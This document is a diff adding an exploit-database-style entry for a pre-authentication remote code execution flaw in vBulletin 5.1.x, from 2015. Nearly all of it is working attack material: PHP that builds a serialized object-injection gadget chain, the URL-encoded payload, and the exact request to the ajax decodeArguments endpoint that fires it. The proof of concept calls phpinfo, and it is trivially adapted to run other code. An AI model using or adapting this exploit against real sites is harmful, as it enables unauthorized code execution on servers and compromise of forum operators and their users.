@@ -1,0 +1,38 @@
+# Exploit Title: Vbulletin 5.1.X unserialize 0day preauth RCE exploit
+# Date: Nov 4th, 2015
+# Exploit Author: hhjj
+# Vendor Homepage: http://www.vbulletin.com/
+# Version: 5.1.x
+# Tested on: Debian
+# CVE : 
+# I did not discover this exploit, leaked from the IoT.
+
+# Build the object
+php << 'eof'
+<?php
+class vB_Database {
+       public $functions = array();
+
+       public function __construct() 
+       {
+               $this->functions['free_result'] = 'phpinfo';
+       }
+}
+
+class vB_dB_Result {
+       protected $db;
+       protected $recordset;
+
+       public function __construct()
+       {
+               $this->db = new vB_Database();
+               $this->recordset = 1;
+       }
+}
+
+print urlencode(serialize(new vB_dB_Result())) . "\n";
+eof
+O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bi%3A1%3B%7D
+
+#Then hit decodeArguments with your payload :
+http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D
